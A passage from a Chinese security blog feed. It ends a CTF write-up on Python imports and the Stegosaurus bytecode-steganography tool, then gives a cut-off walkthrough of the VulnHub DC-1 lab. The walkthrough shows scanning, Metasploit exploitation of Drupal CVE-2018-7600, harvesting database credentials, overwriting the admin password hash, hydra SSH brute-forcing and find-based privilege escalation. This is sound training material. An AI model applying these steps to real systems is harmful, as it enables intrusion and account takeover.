的作用就是，<code>m1</code>与<code>dir1.dir2.module1</code>等效。作用一样。都可以进行调用内存中module1模块中的函数。<br>然后导入<code>module2</code>，所有的模块<code>dir1,dir1.m0re,dir.m0re.module1,dir1.dir3.module2</code>四个模块就全部导入了，函数都可以调用。<br>下面的三条语句都可以实现了。<br>一般都使用绝对导入，而相对导入使用不方便，很容易发生混乱，导致程序报错。</p><h2 id="回到开头"><a href="#回到开头" class="headerlink" title="回到开头"></a>回到开头</h2><p>说了那么多，还是把之前引起思考的那个题目的知识点总结一下。bugkuCTF的题目QAQ<br>题目wp就不重复了，然后就是那个工具，Stegosaurus在github的项目地址为: <a href="https://github.com/AngelKitty/stegosaurus">https://github.com/AngelKitty/stegosaurus</a><br>使用方法学习一下，以便自己以后查看。</p><pre class="language-bash" data-language="bash"><code class="language-bash">python stegosaurus.py -h <span class="token comment">#查看帮助信息、</span>usage: stegosaurus.py <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PAYLOAD<span class="token punctuation">]</span> <span class="token punctuation">[</span>-r<span class="token punctuation">]</span> <span class="token punctuation">[</span>-s<span class="token punctuation">]</span> <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-x<span class="token punctuation">]</span> <span class="token punctuation">[</span>-e EXPLODE<span class="token punctuation">]</span>                      carrierpositional arguments:  carrier               Carrier py, pyc or pyo <span class="token function">file</span>optional arguments:  -h, --help            show this <span class="token builtin class-name">help</span> message and <span class="token builtin class-name">exit</span>  -p PAYLOAD, --payload PAYLOAD                        Embed payload <span class="token keyword">in</span> carrier <span class="token function">file</span>  -r, --report          Report max available payload size carrier supports  -s, --side-by-side    Do not overwrite carrier file, <span class="token function">install</span> side by side                        instead.  -v, --verbose         Increase verbosity once per use  -x, --extract         Extract payload from carrier <span class="token function">file</span>  -e EXPLODE, --explode EXPLODE                        Explode payload into <span class="token function">groups</span> of a limited length <span class="token keyword">if</span> necessary</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 参数说明</span>-h <span class="token comment">#帮助信息</span>-p <span class="token comment">#要隐藏在文件中的payload，payload要用双引号包起</span>-x <span class="token comment">#提取出来隐藏在文件中的payload</span>-s <span class="token comment">#不覆盖，再生成一个文件，为隐藏信息后的文件。保留原来的文件</span>-r <span class="token comment">#查看这个文件，最多成隐藏多少字节的数据</span>-v <span class="token comment">#查看隐藏信息的详细过程，使用次数决定详细程度，一般使用两次就够-vv</span></code></pre><p>单独列出，<code>-e EXPLODE</code>，为什么单独列出来这个，因为在github项目中，readme.md中没有这个参数，在本地执行确发现多了这个参数。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201210161332.png" alt="m0re" loading="lazy"><br>本地执行：<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201210161441.png" alt="m0re" loading="lazy"><br>于是就开始多次尝试。</p><h2 id="再次发现问题并解决"><a href="#再次发现问题并解决" class="headerlink" title="再次发现问题并解决"></a>再次发现问题并解决</h2><p>这个工具使用的话，按照github上面的使用方式使用，无法运行。报错如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali:~/Desktop/m0re/stegosaurus<span class="token comment"># python3 stegosaurus.py m0re.py -r</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:  File <span class="token string">"stegosaurus.py"</span>, line <span class="token number">251</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"stegosaurus.py"</span>, line <span class="token number">217</span>, <span class="token keyword">in</span> main    header, code <span class="token operator">=</span> _loadBytecode<span class="token punctuation">(</span>carrier, logger<span class="token punctuation">)</span>  File <span class="token string">"stegosaurus.py"</span>, line <span class="token number">124</span>, <span class="token keyword">in</span> _loadBytecode    code <span class="token operator">=</span> marshal.load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>ValueError: bad marshal data <span class="token punctuation">(</span>unknown <span class="token builtin class-name">type</span> code<span class="token punctuation">)</span></code></pre><p>多次尝试发现：只有<code>-x</code>参数可以正常使用。<br>其他参数无法使用。使用就会报错。<del>猜想可能不是所有的python文件都可以隐藏payload</del><br>当然，猜想错误，py、pyc、pyo文件均可隐藏信息。那这个报错怎么解决？<br>Google一下，发现答案就在项目中。<br><a href="https://github.com/AngelKitty/stegosaurus/issues/1">https://github.com/AngelKitty/stegosaurus/issues/1</a><br>看到了作者的回复<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201210173736.png" alt="m0re" loading="lazy"></p><blockquote><p>应该是python版本的问题，python3.6是没有问题的 ——作者</p></blockquote><p>而作者打包的那个bin文件，是直接调用的python3.6(<code>这个后面会提到，请继续看</code>)，我的windows主机是<code>3.7</code>，而我实验用的kali默认是<code>3.8</code>，所以才造成都无法使用的结果。<br>按照作者大大的办法，排除问题。</p><h2 id="工具参数"><a href="#工具参数" class="headerlink" title="工具参数"></a>工具参数</h2><p>继续学习这个工具的参数</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali:~/Desktop/m0re/stegosaurus<span class="token comment"># ./stegosaurus m0re.py -s --payload "m0re_wuhu~"</span>Payload embedded <span class="token keyword">in</span> carrierroot@kali:~/Desktop/m0re/stegosaurus<span class="token comment"># ./stegosaurus __pycache__/m0re.cpython-36-stegosaurus.pyc -x</span>Extracted payload: m0re_wuhu~root@kali:~/Desktop/m0re/stegosaurus<span class="token comment"># </span></code></pre><p>然后看下是怎么隐藏的</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali:~/桌面/m0re/stegosaurus<span class="token comment"># ./stegosaurus m0re.py -s --payload "m0re_wuhu~" -vv</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,030 - stegosaurus - DEBUG - Validated args<span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - INFO - Compiled m0re.py as __pycache__/m0re.cpython-36.pyc <span class="token keyword">for</span> use as carrier<span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - Read header and bytecode from carrier<span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - BINARY_SUBTRACT <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - BINARY_TRUE_DIVIDE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - BINARY_MULTIPLY <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - BINARY_ADD <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,032 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - INFO - Found <span class="token number">14</span> bytes available <span class="token keyword">for</span> payloadPayload embedded <span class="token keyword">in</span> carrier<span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - BINARY_SUBTRACT <span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">119</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - BINARY_TRUE_DIVIDE <span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - BINARY_MULTIPLY <span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - BINARY_ADD <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - POP_TOP <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - RETURN_VALUE <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,033 - stegosaurus - DEBUG - Creating new carrier <span class="token function">file</span> name <span class="token keyword">for</span> side-by-side <span class="token function">install</span><span class="token number">2020</span>-12-10 <span class="token number">17</span>:56:40,035 - stegosaurus - INFO - Wrote carrier <span class="token function">file</span> as __pycache__/m0re.cpython-36-stegosaurus.pyc</code></pre><p>上面是隐藏前，发现可以插入的地方。然后下面的部分是隐藏后，最后生成的文件是<code>m0re.cpython-36-stegosaurus.pyc</code>，注意这里生成的pyc文件，cpython-36，可以看出是python3.6解释器解释生成的文件。所以上面说的作者打包的bin文件是直接调用python3.6的解释器的。<br><code>-e EXPLODE</code>经过多次测试发现，这个参数后面还需要加上参数，并且这个参数是整型的，所以payload可以为</p><pre class="language-bash" data-language="bash"><code class="language-bash">./stegosaurus -s --explode <span class="token number">2</span> --payload <span class="token string">"m0re_wuhu~_6"</span> m0re.py</code></pre><p>不是很理解这个参数，理解能力有点欠缺。下面说一下我的试验结果吧。<br>1.当payload &gt; Carrier can support的长度，无法隐藏，可以使用这个参数，限制一下长度，不同宿主文件，可以隐藏的payload长度不同，因为代码中无用空间的大小不同，测试出来参数代表的长度也不一样。<br>2.当payload &lt; Carrier can support的长度，无需用到这个参数。直接隐藏即可。<br>隐藏文件无法通过strings命令查看到。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习到很多知识，首先是工具的使用，涉及到Python中import包的几种导入方式的详细过程。写这篇文章花了挺多的时间和心思的，还有许多不足之处，可能是我没理解到的，还请师傅们多多指点。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.shangmayuan.com/a/78dcc7c2a10046dea693b44d.html">https://www.shangmayuan.com/a/78dcc7c2a10046dea693b44d.html</a><br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/10041534.html">https://www.cnblogs.com/ECJTUACM-873284962/p/10041534.html</a><br><a href="https://www.bbsmax.com/A/A7zgYqRo54/">https://www.bbsmax.com/A/A7zgYqRo54/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Stegosaurus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/posts/361a793a/"/>
      <url>/posts/361a793a/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>靶场下载地址：<a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a><br />安装方法自行百度<br />扫描一下存活靶机，内网可以使用netdiscover或者arp-scan都可以<br />两种方法<br />第一种：</p><pre class="language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">10.0</span>.2.1/24</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606899992125-35d0ff87-776b-4847-950c-fb6202dfbea6.png#align=left&display=inline&height=198&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=629&size=44853&status=done&style=none&width=594" alt="image.png" loading="lazy"><br />第二种：</p><pre class="language-bash" data-language="bash"><code class="language-bash">arp-scan -l</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606900077036-6a5480f5-1e2b-4a5f-859f-57807ff8db47.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=257&originWidth=736&size=62741&status=done&style=none&width=523" alt="image.png" loading="lazy">第二种速度相对快一点<br />很明显12是我的靶机，测试过程省略。nmap扫描信息，</p><pre class="language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2020</span>-12-02 04:09 ESTNmap scan report <span class="token keyword">for</span> <span class="token number">10.0</span>.2.12Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00015s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">997</span> closed portsPORT    STATE SERVICE<span class="token number">22</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span><span class="token number">80</span>/tcp  <span class="token function">open</span>  http<span class="token number">111</span>/tcp <span class="token function">open</span>  rpcbindMAC Address: 08:00:27:88:22:60 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span></code></pre><p>扫描信息显示三个端口开启，首先80端口开启http服务，可以访问查看。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606900295107-6564db1f-87b3-4a44-8132-9ff55a69a30b.png#align=left&display=inline&height=263&margin=%5Bobject%20Object%5D&name=image.png&originHeight=525&originWidth=754&size=53704&status=done&style=none&width=377" alt="image.png" loading="lazy"><br />登录框，弱口令，万能密码，尝试失败，<br /><br><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606900456124-58cfc68f-2826-4360-8e53-d23c822102cd.png#align=left&display=inline&height=193&margin=%5Bobject%20Object%5D&name=image.png&originHeight=385&originWidth=669&size=31250&status=done&style=none&width=334.5" alt="image.png" loading="lazy"><br />但是发现了这个，它是Drupal搭建的CMS框架，所以可以收集一下该CMS的目录，<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606900964412-26eca4f4-e484-4873-91fb-d70c7d6685bd.png#align=left&display=inline&height=346&margin=%5Bobject%20Object%5D&name=image.png&originHeight=692&originWidth=1215&size=176715&status=done&style=none&width=607.5" alt="image.png" loading="lazy"><br />看robots.txt</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#</span><span class="token comment"># robots.txt</span><span class="token comment">#</span><span class="token comment"># This file is to prevent the crawling and indexing of certain parts</span><span class="token comment"># of your site by web crawlers and spiders run by sites like Yahoo!</span><span class="token comment"># and Google. By telling these "robots" where not to go on your site,</span><span class="token comment"># you save bandwidth and server resources.</span><span class="token comment">#</span><span class="token comment"># This file will be ignored unless it is at the root of your host:</span><span class="token comment"># Used:    http://example.com/robots.txt</span><span class="token comment"># Ignored: http://example.com/site/robots.txt</span><span class="token comment">#</span><span class="token comment"># For more information about the robots.txt standard, see:</span><span class="token comment"># http://www.robotstxt.org/wc/robots.html</span><span class="token comment">#</span><span class="token comment"># For syntax checking, see:</span><span class="token comment"># http://www.sxw.org.uk/computing/robots/check.html</span>User-agent: *Crawl-delay: <span class="token number">10</span><span class="token comment"># Directories</span>Disallow: /includes/Disallow: /misc/Disallow: /modules/Disallow: /profiles/Disallow: /scripts/Disallow: /themes/<span class="token comment"># Files</span>Disallow: /CHANGELOG.txtDisallow: /cron.phpDisallow: /INSTALL.mysql.txtDisallow: /INSTALL.pgsql.txtDisallow: /INSTALL.sqlite.txtDisallow: /install.phpDisallow: /INSTALL.txtDisallow: /LICENSE.txtDisallow: /MAINTAINERS.txtDisallow: /update.phpDisallow: /UPGRADE.txtDisallow: /xmlrpc.php<span class="token comment"># Paths (clean URLs)</span>Disallow: /admin/Disallow: /comment/reply/Disallow: /filter/tips/Disallow: /node/add/Disallow: /search/Disallow: /user/register/Disallow: /user/password/Disallow: /user/login/Disallow: /user/logout/<span class="token comment"># Paths (no clean URLs)</span>Disallow: /?q<span class="token operator">=</span>admin/Disallow: /?q<span class="token operator">=</span>comment/reply/Disallow: /?q<span class="token operator">=</span>filter/tips/Disallow: /?q<span class="token operator">=</span>node/add/Disallow: /?q<span class="token operator">=</span>search/Disallow: /?q<span class="token operator">=</span>user/password/Disallow: /?q<span class="token operator">=</span>user/register/Disallow: /?q<span class="token operator">=</span>user/login/Disallow: /?q<span class="token operator">=</span>user/logout/</code></pre><p>同时nikto扫描也得到好多信息<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606901010953-23b23ef0-c187-40c8-83dd-20c3f73ae043.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=544&size=62679&status=done&style=none&width=272" alt="image.png" loading="lazy"><br />这些都在robots.txt，看到一个UPGRADE.txt，应该是升级提醒什么的(瞎猜)<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606901389784-fcc39bbd-2278-48d5-ad6c-35878f957aa3.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=384&originWidth=725&size=59264&status=done&style=none&width=571" alt="image.png" loading="lazy"><br />现在是6的版本，提醒升级到7，看过大师傅博客，了解到这个是一个cve<br />getshell的漏洞（CVE-2018-7600)而且在metasploit中有集成的模块<br />搜索一下</p><pre class="language-bash" data-language="bash"><code class="language-bash">search drupal</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606901711076-0ab7ccc1-a9e5-4dfc-8c56-71a4fc7017ee.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=709&size=145006&status=done&style=none&width=565" alt="image.png" loading="lazy"><br />使用第四个就可以。<br />设置攻击地址，直接exploit就可以了。<br />然后就getshell<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606902053395-6530201d-9f9c-4b54-8b3d-95faaec1bb8b.png#align=left&display=inline&height=193&margin=%5Bobject%20Object%5D&name=image.png&originHeight=385&originWidth=729&size=96537&status=done&style=none&width=364.5" alt="image.png" loading="lazy"><br />当前用户是www-data，看到了第一个flag<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606902137564-d3dfa064-7d99-42b9-96b1-57334937378f.png#align=left&display=inline&height=401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=653&size=91819&status=done&style=none&width=624" alt="image.png" loading="lazy"><br />第一个flag内容是每一个好的CMS需要config文件<br />Every good CMS needs a config file - and so do you.<br />美化命令行<br />python -c “import pty;pty.spawn(‘/bin/bash’)”<br />(PS:看着舒服多了233333)<br />Drupal的默认配置文件为 /var/www/sites/default/settings.php<br />首先看到了flag2<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606903136218-6d2be389-8912-4822-98c4-550697cf808c.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=274&originWidth=618&size=66900&status=done&style=none&width=618" alt="image.png" loading="lazy"><br />然后就是看数据库的用户名和密码</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token string">'default'</span> <span class="token operator">=</span><span class="token operator">></span> array <span class="token punctuation">(</span>  <span class="token string">'database'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'drupaldb'</span>,  <span class="token string">'username'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'dbuser'</span>,  <span class="token string">'password'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'R0ck3t'</span>,  <span class="token string">'host'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span>,  <span class="token string">'port'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span>,  <span class="token string">'driver'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'mysql'</span>,  <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span>,<span class="token punctuation">)</span>,</code></pre><p>连接一下</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql -h localhost -u dbuser -p</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606903738769-4dbb7fe0-6410-4dfa-a391-b1987e393ee2.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=image.png&originHeight=424&originWidth=668&size=105781&status=done&style=none&width=334" alt="image.png" loading="lazy"><br />查看user表的内容，注意Drupal框架默认的用户表就是users表。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606905588598-afd77d3a-4226-4e00-a679-90166c01ddda.png#align=left&display=inline&height=199&margin=%5Bobject%20Object%5D&name=image.png&originHeight=398&originWidth=762&size=111228&status=done&style=none&width=381" alt="image.png" loading="lazy"><br />这个密码，之前的drupal常用密码加密是MD5加密的，可是7.0版本以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以爆破出来很多MD5值，所以Drupal 7的版本已新型加密方法是“加了盐（Salt）”的MD5码，就是平常说的加盐，这种加密不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。<br />这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。<br />这种的要破解是很费劲的，几乎不可能。<br />这是一种方法，直接使用password-hash.sh来改密码<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606909599950-553032b0-f019-40bb-a5cb-2cf4d4611d42.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&name=image.png&originHeight=110&originWidth=762&size=37766&status=done&style=none&width=712" alt="image.png" loading="lazy"><br />这个是使用它的办法将我们想改的密码，经过同样的加密，然后就替换user表中的admin用户的密码值就可以了。<br />然后再次进入到mysql中，替换为$S$DAa3ohGdWz0EX./Gfj4jVg3bqM571O9XclCrwZxYu9qhuVqqOlHm</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql -h localhost -u dbuser -pEnter password: R0ck3tupdate <span class="token function">users</span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">pass</span><span class="token operator">=</span><span class="token string">'<span class="token variable">$S</span><span class="token variable">$DAa3ohGdWz0EX</span>./Gfj4jVg3bqM571O9XclCrwZxYu9qhuVqqOlHm'</span> where <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">'admin'</span><span class="token punctuation">;</span></code></pre><p>登录成功<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606909879785-1243dda4-b469-4945-a5aa-df0ed33e5c95.png#align=left&display=inline&height=281&margin=%5Bobject%20Object%5D&name=image.png&originHeight=561&originWidth=785&size=58755&status=done&style=none&width=392.5" alt="image.png" loading="lazy"><br />浏览网站，找到flag3<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606910532668-4ea5056b-4917-44f0-ac52-697ecdb5fd67.png#align=left&display=inline&height=269&margin=%5Bobject%20Object%5D&name=image.png&originHeight=537&originWidth=789&size=54478&status=done&style=none&width=394.5" alt="image.png" loading="lazy"><br />提示find+exec，提权，emmm，先往下 <br /><br><br />查看一下passwd，发现了 flag4所在，尝试爆破密码<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606911961008-5428aa45-5fac-4ed0-989f-79e0e0e82260.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=485&originWidth=725&size=171587&status=done&style=none&width=362.5" alt="image.png" loading="lazy"><br />然后去home找flag4，<br /><br><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606912802210-815cbb97-43b2-4bfd-a004-f7f12c66eb32.png#align=left&display=inline&height=97&margin=%5Bobject%20Object%5D&originHeight=97&originWidth=553&size=0&status=done&style=none&width=553" loading="lazy"><br /><br><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606912818213-dd712161-4061-45b7-a9bb-be86d472a915.png#align=left&display=inline&height=107&margin=%5Bobject%20Object%5D&name=image.png&originHeight=107&originWidth=584&size=22479&status=done&style=none&width=584" alt="image.png" loading="lazy"><br />需要提权了<br />还可以尝试爆破一下flag4的密码<br />找个强一点的字典，跑下密码，使用hydra爆破</p><pre class="language-bash" data-language="bash"><code class="language-bash">hydra -l flag4 -P /root/Desktop/password.txt ssh://10.0.2.12</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606913605541-6036dc74-0eae-4484-a94c-df5e952561e5.png#align=left&display=inline&height=396&margin=%5Bobject%20Object%5D&name=image.png&originHeight=433&originWidth=774&size=160126&status=done&style=none&width=708" alt="image.png" loading="lazy"><br />ssh连接<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606913908631-555e92ac-e193-4c01-9edd-50e6fb962408.png#align=left&display=inline&height=318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=358&originWidth=757&size=120024&status=done&style=none&width=672" alt="image.png" loading="lazy"><br />成功连接，但不是root权限，所以还是需要提权，flag3提示的find+exec进行提权<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606914180580-20cd6d9b-77e7-4d63-896b-d28f8f000fbf.png#align=left&display=inline&height=391&margin=%5Bobject%20Object%5D&name=image.png&originHeight=407&originWidth=751&size=135498&status=done&style=none&width=722" alt="image.png" loading="lazy"><br />find命令，与提权相关的知识附加一下<br />find实例<br /></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#找当前目录下所有的txt文件</span>flag4@DC-1:~$ <span class="token function">find</span> -name <span class="token string">'*.txt'</span>./flag4.txt<span class="token comment">#在root目录下查找大于50m小于100m的文件</span>flag4@DC-1:~$ <span class="token function">find</span> / -size +50M -size -100M -type f/sys/devices/pci0000:00/0000:00:02.0/resource0/sys/devices/pci0000:00/0000:00:02.0/resource0_wcfind: <span class="token variable"><span class="token variable">`</span>/proc/3868/task/3868/fd/5': No such <span class="token function">file</span> or directoryfind: <span class="token variable">`</span></span>/proc/3868/task/3868/fdinfo/5<span class="token string">': No such file or directoryfind: <span class="token variable"><span class="token variable">`</span>/proc/3868/fd/5': No such <span class="token function">file</span> or directoryfind: <span class="token variable">`</span></span>/proc/3868/fdinfo/5'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory<span class="token comment">#查找十分钟内读取过的文件</span>flag4@DC-1:~$ <span class="token function">find</span> / -amin <span class="token number">10</span> -type f find: <span class="token variable"><span class="token variable">`</span>/proc/3876/task/3876/fd/5': No such <span class="token function">file</span> or directoryfind: <span class="token variable">`</span></span>/proc/3876/task/3876/fdinfo/5<span class="token string">': No such file or directoryfind: <span class="token variable"><span class="token variable">`</span>/proc/3876/fd/5': No such <span class="token function">file</span> or directoryfind: <span class="token variable">`</span></span>/proc/3876/fdinfo/5'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory<span class="token comment">#找出当前目录下权限为777的文件或目录并排序</span>flag4@DC-1:/$ <span class="token function">find</span> -perm -777 -type f <span class="token operator">|</span> <span class="token function">sort</span>find: <span class="token variable"><span class="token variable">`</span>./proc/3917/task/3917/fd/5': No such <span 